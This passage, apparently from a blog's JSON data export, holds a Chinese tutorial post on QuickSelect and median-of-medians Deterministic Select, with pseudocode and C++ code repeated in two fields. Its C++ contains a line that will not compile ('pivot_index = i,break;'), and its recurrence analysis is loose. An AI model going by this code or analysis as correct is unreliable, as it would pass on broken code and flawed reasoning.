input array\n * num        -   want to find the num-th number\n *                in this array\n * =============================================\n * Return     -   the num-th number\n */\nint DS(int * arr, int arr_size, int num)\n{\n    if(arr_size == 1)\n    {\n        return arr[0];\n    }\n    \n    int arr_num = arr_size / 5;\n    int *split_median = new int[arr_num + 1];\n    for(int i = 0;i<arr_num;++i)\n    {\n        split_median[i] = BubbleSort(arr + i * 5, 5);\n    }\n    if(arr_size % 5 != 0)\n    {\n        split_median[arr_num] = BubbleSort(arr + arr_num*5, arr_size - arr_num*5);\n        arr_num ++;\n    }\n    \n    int pivot,pivot_index;\n    pivot = DS(split_median, arr_num, arr_num/2);\n    delete [] split_median;\n    \n    for(int i = 0;i<arr_size;++i)\n    {\n        if(pivot == arr[i]) pivot_index = i,break;\n    }\n    \n    int left = 0, right = arr_size-1;\n    arr[pivot_index] = arr[0];\n    while(left < right)\n    {\n        while(left < right && arr[right] >= pivot)\n            right --;\n        if(left < right)\n            arr[left ++] = arr[right];\n        while(left < right && arr[left] < pivot)\n            left ++;\n        if(left < right)\n            arr[right --] = arr[left];\n    }\n    arr[left] = pivot;\n    \n    if(left == (num-1)) return pivot;\n    if((num-1) < left) return DS(arr, left, num);\n    else return DS(arr + left + 1, arr_size - left - 1, num - left - 1);\n}\n\nint main()\n{\n    int Size = 23;\n    int *Array = new int[Size];\n    cout << \"Please choose the n-th number, the max number is \"<< Size<<\" : \"<<endl;\n    int No;\n    cin >> No;\n    freopen(\"input.txt\", \"r\", stdin);\n    for(int i = 0;i<Size;++i) cin >> Array[i];\n    int ans = DS(Array, Size, No);\n    cout << ans << endl;\n    return 0;\n}\n```\n\n","slug":"DS","published":1,"date":"2016-10-27T16:00:00.000Z","updated":"2018-04-23T11:53:10.000Z","comments":1,"photos":[],"link":"","_id":"cji4qizb1000arikey9k1622z","content":"<blockquote>\n<p>“可参考《算法导论 第三版》第123页”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>算法老师 Dominik 在 week5 最后一节课快结束时讲到，当时比较匆忙，在此做以整理，尽量使说明通俗易懂。</p>\n<p>这个算法用于求一个无序数组中的第k大数，并且可以保证<strong>最坏情况下</strong>时间复杂度为 O(n)。在本文最后会对这一时间复杂度进行说明。</p>\n<hr>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>寻找第k大的数，这是个看起来十分简单的问题，最简单的想法，把数组排个序，然后输出第k个。那么对于排序算法，有归并排序<strong>MergeSort</strong>和快速排序<strong>QuickSort</strong>，时间复杂度都是O（nlogn），当然你也可以使用堆排序，然后pop k次。</p>\n<p>本文将介绍一种<strong>基于中位数</strong>的快速选择算法 <strong>Deterministic Select</strong>，它可以达到最坏情况下O（n）的时间复杂度。在介绍这一算法前需要首先熟悉一下通常而言的 <strong>QuickSelect</strong> 方法。</p>\n<h3 id=\"Quick-Select\"><a href=\"#Quick-Select\" class=\"headerlink\" title=\"Quick Select\"></a>Quick Select</h3><p>当然，其实我很想说，在介绍快速选择算法<strong>quickselect</strong>之前，需要先熟悉一下快速排序算法<strong>quicksort</strong>，可是这样就显得啰哩啰嗦了。所以如果你不知道快排的话，还是先乖乖的拿起数据结构或者算法书学习一个。</p>\n<p>快速选择的思想来源于快速排序，转化也十分简单。</p>\n<p>在快速排序中，我们首先随机选择数组中的一个数作为<strong>pivot</strong>（一般选择第一个数），然后遍历一遍数组，<strong><em>将比pivot小的数放在它的左边，将比pivot大的数放在它的右边</em></strong>，再递归排序pivot左右两侧的数即可。</p>\n<p>在快速选择时，因为我们要寻找第k大的数，所以我们可以记录一下在上面斜体字执行完后，pivot 是这个数组中的第几个（假设为第 m 个），如果k == m，那么 pivot就是第k大的数，如果k &lt; m，那么第 k 大的数在 pivot 左边的数组中，依然是第k大，否则在 pivot 右边的数组中，是第 k - m 大。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 伪代码</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">QuickSelect</span><span class=\"params\">(<span class=\"built_in\">array</span> A, <span class=\"keyword\">int</span> k)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> |A| == <span class=\"number\">0</span> : error</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> |A| == <span class=\"number\">1</span> : <span class=\"keyword\">if</span> K == <span class=\"number\">1</span> :<span class=\"keyword\">return</span> A[<span class=\"number\">1</span>]</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> : error</span><br><span class=\"line\">\tselect pivot from A randomly</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">array</span> Left : those &lt; pivot</span><br><span class=\"line\">\t<span class=\"built_in\">array</span> Right : those &gt;= pivot</span><br><span class=\"line\">\tm = |Left| + <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> k == m : <span class=\"keyword\">return</span> pivot</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> k &lt; m : <span class=\"keyword\">return</span> QuickSelect(Left, k)</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> : <span class=\"keyword\">return</span> QuickSelect(Right, k-m)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>由于quicksort对于 pivot 选择的随机性，我们可以计算它的average running time 的 worst case。</p>\n<p><img src=\"/images/in-post/post-blog-devidearray.png\" alt=\"img\"></p>\n<p>现在我们做如下定义，假设上图代表一个数组，我们称在完成一次数组划分后，pivot 位于数组靠近中间的位置为 good 位置，位于靠两边的位置为 bad 位置。那么 good 与 bad 的长度各占1/2.</p>\n<p>现在计算worst case，在最坏情况下，在一次数组划分后，pivot位于数组的起始或结束位置，设数组长度为n，在数组中寻找第k大的数所需时间为 T(n)。则T（n）的迭代式如下</p>\n<p>$$T(n)=n+\\frac{1}{2}T(n)+\\frac{1}{2}T(\\frac{3}{4}n)$$</p>\n<p>如何理解这个式子呢，首先，对数组以pivot为标准划分一次需要O（n）的时间，此时 pivot 要么在 good 位置，要么在 bad 位置，随机情况下，两者的概率是1/2，因为现在考虑最坏情况，那么pivot的位置会在上图<strong>灰色箭头</strong>处,于是若pivot在bad位置，则所需时间为T(n),若在good位置，所需时间为T(3n/4)。</p>\n<p>对迭代式稍作变换有</p>\n<p>$$T(n)=2*n+T(\\frac{3}{4}n)$$</p>\n<p>根据等比数列求和可得</p>\n<p>$$T(n)=8n$$</p>\n<p>于是，在平均情况下，quicksort的最坏时间复杂度是线性的。但是，考虑非平均情况，比如这个数组的结构不是很好或者我们的运气很背，导致每次划分完数组，pivot的位置都在数组的两端，那么这个方法就会退化为O（n^2）。下面要介绍的Deterministic Select算法则可以保证在最坏情况下，时间复杂度也是O（n）。</p>\n<h3 id=\"Deterministic-Select\"><a href=\"#Deterministic-Select\" class=\"headerlink\" title=\"Deterministic Select\"></a>Deterministic Select</h3><p>考虑我们的输入数组为</p>\n<pre><code>100 93 78 76 34\n25 22 9 6 1024\n135 68 24 153 1\n56 89 111 14 46\n1034 45 12\n</code></pre><p>我们将这个数组以五个数为一组进行划分并排序，得到</p>\n<p><img src=\"/images/in-post/post-blog-5itemarray1.png\" alt=\"img\"></p>\n<p>然后，我们以每组中位数的大小进行排序，得到</p>\n<p><img src=\"/images/in-post/post-blog-5itemarray2.png\" alt=\"img\"></p>\n<p>从图中可以看出，这些中位数的中位数是56，而且经过这些操作，上图黄色底色位置的数可以被确定大于56，计算一下黄色底色的个数，不算<strong>中位数的中位数</strong> 56 所在的列和不足5个的列（在本例中，不足5个数的列恰在左边，当然它很可能出现在右边），则其个数至少为</p>\n<p>$$3*(\\frac{1}{2}[\\frac{n}{5}]-2)&gt;=\\frac{3n}{10}-6$$</p>\n<p>同理，可以确定小于 56 的数（在左上角）的个数也至少为这么多。看到这里大家可能会明白了吧，如果我们选择 56 作为 pivot ，那么每次划分数组，都可以保证 pivot 的左右两边分别至少被划分了这么多数，为方便计算，去掉常数项，就有3n/10的数至少分布在 pivot 两侧，这个比例很接近1/3，也就是说经过这样划分，pivot 处于good位置，考虑此时的worst case</p>\n<p>$$T(n)=n+T(\\frac{3}{10}n)$$</p>\n<p>很明显这是线性时间复杂度。</p>\n<p>这一算法的思想依然来源于quicksort，但是通过巧妙选取pivot，使得每次划分数组，都可以至少排除约1/3的数，从而保证了时间的线性性质。</p>\n<p>下面是算法的代码实现，在实际过程中，我们没必要对5个数的小数组再进行按照中位数排序，只要递归找到中位数的中位数即可（上面对5个小数组排序只是为了说明所占比例问题）</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//  main.cpp</span></span><br><span class=\"line\"><span class=\"comment\">//  deterministic_select</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//  Created on 16/10/27.</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*-----------------------------------------------</span></span><br><span class=\"line\"><span class=\"comment\"> * Function   -   sort these 5 numbers and return</span></span><br><span class=\"line\"><span class=\"comment\"> *                the median</span></span><br><span class=\"line\"><span class=\"comment\"> * ==============================================</span></span><br><span class=\"line\"><span class=\"comment\"> * arr        -   the array need to be sorted</span></span><br><span class=\"line\"><span class=\"comment\"> * arr_size   -   the size</span></span><br><span class=\"line\"><span class=\"comment\"> * ==============================================</span></span><br><span class=\"line\"><span class=\"comment\"> * Return     -   the median</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">BubbleSort</span><span class=\"params\">(<span class=\"keyword\">int</span> *arr, <span class=\"keyword\">int</span> arr_size)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *a =<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[arr_size];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i&lt; arr_size;++i) a[i] = arr[i];</span><br><span class=\"line\">    <span class=\"keyword\">bool</span> flag;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i&lt;arr_size;++i)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        flag = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j = i;j&lt;arr_size;++j)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(a[i] &gt; a[j])</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"keyword\">int</span> tmp = a[i];</span><br><span class=\"line\">                a[i] = a[j];</span><br><span class=\"line\">                a[j] = tmp;</span><br><span class=\"line\">                flag = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(! flag) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a[arr_size/<span class=\"number\">2</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*----------------------------------------------</span></span><br><span class=\"line\"><span class=\"comment\"> * Function   -   return the num-th number in</span></span><br><span class=\"line\"><span class=\"comment\"> *                this array running time O(n)</span></span><br><span class=\"line\"><span class=\"comment\"> * =============================================</span></span><br><span class=\"line\"><span class=\"comment\"> * arr        -   the input array</span></span><br><span class=\"line\"><span class=\"comment\"> * arr_size   -   the size of the input array</span></span><br><span class=\"line\"><span class=\"comment\"> * num        -   want to find the num-th number</span></span><br><span class=\"line\"><span class=\"comment\"> *                in this array</span></span><br><span class=\"line\"><span class=\"comment\"> * =============================================</span></span><br><span class=\"line\"><span class=\"comment\"> * Return     -   the num-th number</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">DS</span><span class=\"params\">(<span class=\"keyword\">int</span> * arr, <span class=\"keyword\">int</span> arr_size, <span class=\"keyword\">int</span> num)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(arr_size == <span class=\"number\">1</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> arr[<span class=\"number\">0</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">int</span> arr_num = arr_size / <span class=\"number\">5</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *split_median = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[arr_num + <span class=\"number\">1</span>];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i&lt;arr_num;++i)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        split_median[i] = BubbleSort(arr + i * <span class=\"number\">5</span>, <span class=\"number\">5</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(arr_size % <span class=\"number\">5</span> != <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        split_median[arr_num] = BubbleSort(arr + arr_num*<span class=\"number\">5</span>, arr_size - arr_num*<span class=\"number\">5</span>);</span><br><span class=\"line\">        arr_num ++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">int</span> pivot,pivot_index;</span><br><span class=\"line\">    pivot = DS(split_median, arr_num, arr_num/<span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"keyword\">delete</span> [] split_median;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i&lt;arr_size;++i)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(pivot == arr[i]) pivot_index = i,<span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">int</span> left = <span class=\"number\">0</span>, right = arr_size<span class=\"number\">-1</span>;</span><br><span class=\"line\">    arr[pivot_index] = arr[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(left &lt; right)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(left &lt; right &amp;&amp; arr[right] &gt;= pivot)</span><br><span class=\"line\">            right --;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(left &lt; right)</span><br><span class=\"line\">            arr[left ++] = arr[right];</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(left &lt; right &amp;&amp; arr[left] &lt; pivot)</span><br><span class=\"line\">            left ++;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(left &lt; right)</span><br><span class=\"line\">            arr[right --] = arr[left];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    arr[left] = pivot;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(left == (num<span class=\"number\">-1</span>)) <span class=\"keyword\">return</span> pivot;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>((num<span class=\"number\">-1</span>) &lt; left) <span class=\"keyword\">return</span> DS(arr, left, num);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">return</span> DS(arr + left + <span class=\"number\">1</span>, arr_size - left - <span class=\"number\">1</span>, num - left - <span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> Size = <span class=\"number\">23</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *Array = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[Size];</span><br><span class=\"line\">    <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"Please choose the n-th number, the max number is \"</span>&lt;&lt; Size&lt;&lt;<span class=\"string\">\" : \"</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> No;</span><br><span class=\"line\">    <span class=\"built_in\">cin</span> &gt;&gt; No;</span><br><span class=\"line\">    freopen(<span class=\"string\">\"input.txt\"</span>, <span class=\"string\">\"r\"</span>, <span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i&lt;Size;++i) <span class=\"built_in\">cin</span> &gt;&gt; Array[i];</span><br><span class=\"line\">    <span class=\"keyword\">int</span> ans = DS(Array, Size, No);</span><br><span class=\"line\">    <span class=\"built_in\">cout</span> &lt;&lt; ans &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{"projects":[{"name":"Sjtueat","url":"http://sjtueat.miyunluo.com","desc":"Help you to decide what to eat today"},{"name":"Easy Flash Tool","url":"https://github.com/miyunluo/CortexM4-flashtool","desc":"A easy python flash tool for TI TM4C1294"}]}},"excerpt":"","more":"<blockquote>\n<p>“可参考《算法导论 第三版》第123页”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>算法老师 Dominik 在 week5 最后一节课快结束时讲到，当时比较匆忙，在此做以整理，尽量使说明通俗易懂。</p>\n<p>这个算法用于求一个无序数组中的第k大数，并且可以保证<strong>最坏情况下</strong>时间复杂度为 O(n)。在本文最后会对这一时间复杂度进行说明。</p>\n<hr>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>寻找第k大的数，这是个看起来十分简单的问题，最简单的想法，把数组排个序，然后输出第k个。那么对于排序算法，有归并排序<strong>MergeSort</strong>和快速排序<strong>QuickSort</strong>，时间复杂度都是O（nlogn），当然你也可以使用堆排序，然后pop k次。</p>\n<p>本文将介绍一种<strong>基于中位数</strong>的快速选择算法 <strong>Deterministic Select</strong>，它可以达到最坏情况下O（n）的时间复杂度。在介绍这一算法前需要首先熟悉一下通常而言的 <strong>QuickSelect</strong> 方法。</p>\n<h3 id=\"Quick-Select\"><a href=\"#Quick-Select\" class=\"headerlink\" title=\"Quick Select\"></a>Quick Select</h3><p>当然，其实我很想说，在介绍快速选择算法<strong>quickselect</strong>之前，需要先熟悉一下快速排序算法<strong>quicksort</strong>，可是这样就显得啰哩啰嗦了。所以如果你不知道快排的话，还是先乖乖的拿起数据结构或者算法书学习一个。</p>\n<p>快速选择的思想来源于快速排序，转化也十分简单。</p>\n<p>在快速排序中，我们首先随机选择数组中的一个数作为<strong>pivot</strong>（一般选择第一个数），然后遍历一遍数组，<strong><em>将比pivot小的数放在它的左边，将比pivot大的数放在它的右边</em></strong>，再递归排序pivot左右两侧的数即可。</p>\n<p>在快速选择时，因为我们要寻找第k大的数，所以我们可以记录一下在上面斜体字执行完后，pivot 是这个数组中的第几个（假设为第 m 个），如果k == m，那么 pivot就是第k大的数，如果k &lt; m，那么第 k 大的数在 pivot 左边的数组中，依然是第k大，否则在 pivot 右边的数组中，是第 k - m 大。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 伪代码</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">QuickSelect</span><span class=\"params\">(<span class=\"built_in\">array</span> A, <span class=\"keyword\">int</span> k)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> |A| == <span class=\"number\">0</span> : error</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> |A| == <span class=\"number\">1</span> : <span class=\"keyword\">if</span> K == <span class=\"number\">1</span> :<span class=\"keyword\">return</span> A[<span class=\"number\">1</span>]</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> : error</span><br><span class=\"line\">\tselect pivot from A randomly</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">array</span> Left : those &lt; pivot</span><br><span class=\"line\">\t<span class=\"built_in\">array</span> Right : those &gt;= pivot</span><br><span class=\"line\">\tm = |Left| + <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> k == m : <span class=\"keyword\">return</span> pivot</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> k &lt; m : <span class=\"keyword\">return</span> QuickSelect(Left, k)</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> : <span class=\"keyword\">return</span> QuickSelect(Right, k-m)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>由于quicksort对于 pivot 选择的随机性，我们可以计算它的average running time 的 worst case。</p>\n<p><img src=\"/images/in-post/post-blog-devidearray.png\" alt=\"img\"></p>\n<p>现在我们做如下定义，假设上图代表一个数组，我们称在完成一次数组划分后，pivot 位于数组靠近中间的位置为 good 位置，位于靠两边的位置为 bad 位置。那么 good 与 bad 的长度各占1/2.</p>\n<p>现在计算worst case，在最坏情况下，在一次数组划分后，pivot位于数组的起始或结束位置，设数组长度为n，在数组中寻找第k大的数所需时间为 T(n)。则T（n）的迭代式如下</p>\n<p>$$T(n)=n+\\frac{1}{2}T(n)+\\frac{1}{2}T(\\frac{3}{4}n)$$</p>\n<p>如何理解这个式子呢，首先，对数组以pivot为标准划分一次需要O（n）的时间，此时 pivot 要么在 good 位置，要么在 bad 位置，随机情况下，两者的概率是1/2，因为现在考虑最坏情况，那么pivot的位置会在上图<strong>灰色箭头</strong>处,于是若pivot在bad位置，则所需时间为T(n),若在good位置，所需时间为T(3n/4)。</p>\n<p>对迭代式稍作变换有</p>\n<p>$$T(n)=2*n+T(\\frac{3}{4}n)$$</p>\n<p>根据等比数列求和可得</p>\n<p>$$T(n)=8n$$</p>\n<p>于是，在平均情况下，quicksort的最坏时间复杂度是线性的。但是，考虑非平均情况，比如这个数组的结构不是很好或者我们的运气很背，导致每次划分完数组，pivot的位置都在数组的两端，那么这个方法就会退化为O（n^2）。下面要介绍的Deterministic Select算法则可以保证在最坏情况下，时间复杂度也是O（n）。</p>\n<h3 id=\"Deterministic-Select\"><a href=\"#Deterministic-Select\" class=\"headerlink\" title=\"Deterministic Select\"></a>Deterministic Select</h3><p>考虑我们的输入数组为</p>\n<pre><code>100 93 78 76 34\n25 22 9 6 1024\n135 68 24 153 1\n56 89 111 14 46\n1034 45 12\n</code></pre><p>我们将这个数组以五个数为一组进行划分并排序，得到</p>\n<p><img src=\"/images/in-post/post-blog-5itemarray1.png\" alt=\"img\"></p>\n<p>然后，我们以每组中位数的大小进行排序，得到</p>\n<p><img src=\"/images/in-post/post-blog-5itemarray2.png\" alt=\"img\"></p>\n<p>从图中可以看出，这些中位数的中位数是56，而且经过这些操作，上图黄色底色位置的数可以被确定大于56，计算一下黄色底色的个数，不算<strong>中位数的中位数</strong> 56 所在的列和不足5个的列（在本例中，不足5个数的列恰在左边，当然它很可能出现在右边），则其个数至少为</p>\n<p>$$3*(\\frac{1}{2}[\\frac{n}{5}]-2)&gt;=\\frac{3n}{10}-6$$</p>\n<p>同理，可以确定小于 56 的数（在左上角）的个数也至少为这么多。看到这里大家可能会明白了吧，如果我们选择 56 作为 pivot ，那么每次划分数组，都可以保证 pivot 的左右两边分别至少被划分了这么多数，为方便计算，去掉常数项，就有3n/10的数至少分布在 pivot 两侧，这个比例很接近1/3，也就是说经过这样划分，pivot 处于good位置，考虑此时的worst case</p>\n<p>$$T(n)=n+T(\\frac{3}{10}n)$$</p>\n<p>很明显这是线性时间复杂度。</p>\n<p>这一算法的思想依然来源于quicksort，但是通过巧妙选取pivot，使得每次划分数组，都可以至少排除约1/3的数，从而保证了时间的线性性质。</p>\n<p>下面是算法的代码实现，在实际过程中，我们没必要对5个数的小数组再进行按照中位数排序，只要递归找到中位数的中位数即可（上面对5个小数组排序只是为了说明所占比例问题）</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span 